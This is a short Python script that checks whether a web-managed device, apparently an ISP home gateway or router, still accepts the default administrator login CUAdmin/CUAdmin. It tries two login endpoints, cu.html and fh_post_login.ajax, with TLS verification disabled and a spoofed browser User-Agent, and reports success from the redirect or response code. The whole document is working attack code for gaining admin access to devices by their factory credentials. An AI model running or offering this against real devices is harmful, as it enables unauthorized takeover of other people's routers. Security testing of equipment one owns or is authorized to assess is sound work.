import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"cu.html"
	body="frashnum=&action=login&Frm_Logintoken=1&Username=CUAdmin&Password=CUAdmin&Username=&Password="
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	try:
		if len(reditList)>0:
			f_list=[]
			for response in reditList:
				if response.status_code == 302 and response.headers["location"] == "/menu.gch":
					f_list.append(1)
			if len(f_list)==1:
				r0=True
			else:
				r0=False
		else:
			if response.status_code == 200 and response.headers["location"] == "/menu.gch":
				r0=True
			else:
				r0=False
	except:
		r0=False
	url=baseurl+"fh_post_login.ajax?username=CUAdmin&password=CUAdmin"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if response.status_code == 200 and 'ret":"0"' in response.text:
		r1=True
	else:
		r1=False
	if r0 or r1:
		return True
	else:
		return False
